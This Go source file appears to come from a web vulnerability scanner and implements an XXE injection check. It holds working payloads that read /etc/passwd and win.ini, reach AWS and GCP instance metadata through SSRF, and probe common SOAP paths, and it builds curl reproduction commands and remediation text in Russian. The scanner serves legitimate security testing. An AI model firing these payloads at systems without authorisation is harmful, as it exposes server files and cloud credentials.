package checks

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"vectrixgo/internal/crawler"
	"vectrixgo/internal/findings"
	"vectrixgo/internal/httpsession"
	"vectrixgo/internal/logging"
)

// xxePayload mirrors the (xml_body, technique_label, response_signature_regex)
// tuples in modules/checks/xxe.py.
type xxePayload struct {
	body      string
	technique string
	signature *regexp.Regexp
}

var xxeFilePayloads = []xxePayload{
	{
		body: `<?xml version="1.0" encoding="UTF-8"?>` +
			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
			`<root><data>&xxe;</data></root>`,
		technique: "LFI via file:///etc/passwd",
		signature: regexp.MustCompile(`(?i)root:.*:0:0:`),
	},
	{
		body: `<?xml version="1.0" encoding="UTF-8"?>` +
			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>` +
			`<root><data>&xxe;</data></root>`,
		technique: "Hostname disclosure via file:///etc/hostname",
		signature: regexp.MustCompile(`(?i)[a-zA-Z0-9][a-zA-Z0-9\-]{2,}`),
	},
	{
		body: `<?xml version="1.0" encoding="UTF-8"?>` +
			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>` +
			`<root><data>&xxe;</data></root>`,
		technique: "Windows LFI via file:///C:/Windows/win.ini",
		signature: regexp.MustCompile(`(?i)\[fonts\]|for 16-bit app support`),
	},
}

var xxeSSRFPayloads = []xxePayload{
	{
		body: `<?xml version="1.0"?>` +
			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>` +
			`<root><data>&xxe;</data></root>`,
		technique: "SSRF → AWS instance metadata",
		signature: regexp.MustCompile(`(?i)ami-id|instance-id|security-credentials|placement/`),
	},
	{
		body: `<?xml version="1.0"?>` +
			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>` +
			`<root><data>&xxe;</data></root>`,
		technique: "SSRF → GCP metadata",
		signature: regexp.MustCompile(`(?i)computeMetadata|instance/|project/`),
	},
}

// XXE_ERROR_PAYLOAD — non-existent path, leaks absolute server path in error.
var xxeErrorPayload = xxePayload{
	body: `<?xml version="1.0"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///vectrix_xxe_probe_nonexistent_9z7k">]>` +
		`<root>&xxe;</root>`,
	technique: "Error-based path disclosure",
	signature: regexp.MustCompile(`(?i)vectrix_xxe_probe|No such file|cannot open|FileNotFoundException|java\.io\.|` +
		`\/var\/www|\/home\/|\/opt\/|C:\\`),
}

// XXE_PARAM_PAYLOAD — parameter entity (DOCTYPE in subset).
var xxeParamPayload = xxePayload{
	body: `<?xml version="1.0"?>` +
		`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>`,
	technique: "Parameter entity XXE (file:///etc/passwd)",
	signature: regexp.MustCompile(`(?i)root:.*:0:0:`),
}

// xxeAllPayloads mirrors ALL_PAYLOADS in xxe.py.
var xxeAllPayloads = func() []xxePayload {
	all := make([]xxePayload, 0, len(xxeFilePayloads)+len(xxeSSRFPayloads)+2)
	all = append(all, xxeFilePayloads...)
	all = append(all, xxeSSRFPayloads...)
	all = append(all, xxeErrorPayload, xxeParamPayload)
	return all
}()

// xxeXMLContentTypes mirrors XML_CONTENT_TYPES; only the first two are used
// for probing (application/xml first, then text/xml).
var xxeXMLContentTypes = []string{
	"application/xml",
	"text/xml",
	"application/soap+xml",
	"application/rss+xml",
	"application/atom+xml",
}

// xxeSOAPPaths mirrors the soap_paths list in _probe_soap_endpoints.
var xxeSOAPPaths = []string{
	"/api/soap", "/soap", "/ws", "/services", "/WebService",
	"/api/xml", "/xml", "/import", "/upload", "/parse",
}

// RunXXE checks endpoints accepting XML/SVG content (and standard XML-based
// formats — WSDL, SOAP, RSS, Atom) for XML External Entity injection.
// Mirrors modules/checks/xxe.py run().
func RunXXE(session *httpsession.Session, baseURL string, endpoints []crawler.Endpoint, store *findings.FindingStore) {
	logging.Println("[*] Checking XXE...")
	curlAuth := session.CurlAuthFlags(baseURL)

	tested := make(map[string]struct{})

	for _, ep := range endpoints {
		if _, ok := tested[ep.URL]; ok {
			continue
		}

		ct := strings.ToLower(ep.ContentType)
		urlLower := strings.ToLower(ep.URL)

		isXMLCandidate := false
		for _, x := range []string{"xml", "svg", "soap", "wsdl", "rss", "atom"} {
			if strings.Contains(ct, x) {
				isXMLCandidate = true
				break
			}
		}
		if !isXMLCandidate {
			for _, ext := range []string{".xml", ".svg", ".wsdl", ".asmx", ".svc"} {
				if strings.HasSuffix(urlLower, ext) {
					isXMLCandidate = true
					break
				}
			}
		}
		if !isXMLCandidate {
			if ep.Method == "POST" || ep.Method == "PUT" || ep.Method == "PATCH" {
				isXMLCandidate = true
			}
		}

		if !isXMLCandidate {
			continue
		}

		tested[ep.URL] = struct{}{}
		if xxeTestEndpoint(session, ep, curlAuth, store) {
			continue // Stop after first confirmed XXE per endpoint
		}
	}

	// Also probe SOAP/XML endpoints from interesting paths.
	xxeProbeSOAPEndpoints(session, baseURL, curlAuth, store, tested)
}

// xxeTestEndpoint mirrors _test_xxe — tries every payload/content-type
// combination and confirms with a benign baseline before reporting.
func xxeTestEndpoint(session *httpsession.Session, ep crawler.Endpoint, curlAuth string, store *findings.FindingStore) bool {
	for _, p := range xxeAllPayloads {
		for _, ct := range xxeXMLContentTypes[:2] { // application/xml first, then text/xml
			resp := xxeSend(session, ep, p.body, ct)
			if resp == nil {
				continue
			}

			loc := p.signature.FindStringIndex(resp.Body)
			if loc == nil {
				continue
			}

			// Confirm: baseline with benign XML should NOT have the signature.
			baseline := xxeSend(session, ep, `<root><data>test</data></root>`, ct)
			if baseline != nil && p.signature.MatchString(baseline.Body) {
				continue // Signature present without XXE — false positive
			}

			severity := findings.High
			if strings.Contains(p.technique, "SSRF") || strings.Contains(strings.ToLower(p.technique), "passwd") {
				severity = findings.Critical
			}

			payloadSnippet := p.body
			if len(payloadSnippet) > 300 {
				payloadSnippet = payloadSnippet[:300]
			}

			curlCmd := fmt.Sprintf("curl -sk %s -X %s -H 'Content-Type: %s' --data-binary '%s' '%s'",
				curlAuth, ep.Method, ct, payloadSnippet, ep.URL)

			matchText := resp.Body[loc[0]:loc[1]]

			f := findings.NewFinding(
				fmt.Sprintf("XXE Injection — %s", p.technique),
				severity,
				"Injection",
				"CWE-611",
				ep.URL,
				fmt.Sprintf("Endpoint %s обрабатывает внешние XML-сущности.\n"+
					"Техника: %s\n\n"+
					"XXE позволяет:\n"+
					"• Читать произвольные файлы с сервера (LFI)\n"+
					"• Совершать SSRF-запросы от имени сервера\n"+
					"• В Java-окружениях — RCE через Expect/FTP protocol handlers\n"+
					"• DoS через Billion Laughs (entity expansion)",
					ep.URL, p.technique),
				"1. Отключите DTD и внешние сущности в XML-парсере:\n"+
					"   • Java (SAX/DOM): factory.setFeature(FEATURE_SECURE_PROCESSING, true)\n"+
					"   • Python: используйте defusedxml вместо stdlib xml\n"+
					"   • PHP: libxml_set_external_entity_loader(null)\n"+
					"   • .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit\n"+
					"2. Используйте JSON вместо XML где возможно.\n"+
					"3. Валидируйте XML по строгой XSD-схеме (whitelist).",
				curlCmd,
			)
			f.Method = ep.Method
			f.Evidence = fmt.Sprintf("Payload вернул: ...%s...\nContent-Type запроса: %s",
				truncate(matchText, 200), ct)
			store.Add(f)
			return true
		}
	}

	return false
}

// xxeProbeSOAPEndpoints mirrors _probe_soap_endpoints — probes a static list
// of common SOAP/XML import paths under base_url.
func xxeProbeSOAPEndpoints(session *httpsession.Session, baseURL, curlAuth string, store *findings.FindingStore, tested map[string]struct{}) {
	for _, path := range xxeSOAPPaths {
		u := strings.TrimRight(baseURL, "/") + path
		if _, ok := tested[u]; ok {
			continue
		}

		ep := crawler.Endpoint{
			URL:         u,
			Method:      "POST",
			ContentType: "application/xml",
		}
		tested[u] = struct{}{}
		xxeTestEndpoint(session, ep, curlAuth, store)
	}
}

// xxeSend mirrors _send — sends the XML body with the given content type and
// returns nil on error.
func xxeSend(session *httpsession.Session, ep crawler.Endpoint, body, contentType string) *httpsession.Response {
	resp, err := session.Request(ep.Method, ep.URL, httpsession.Options{
		Headers:        map[string]string{"Content-Type": contentType},
		Body:           strings.NewReader(body),
		AllowRedirects: true,
		Timeout:        15 * time.Second,
	})
	if err != nil {
		return nil
	}
	return resp
}
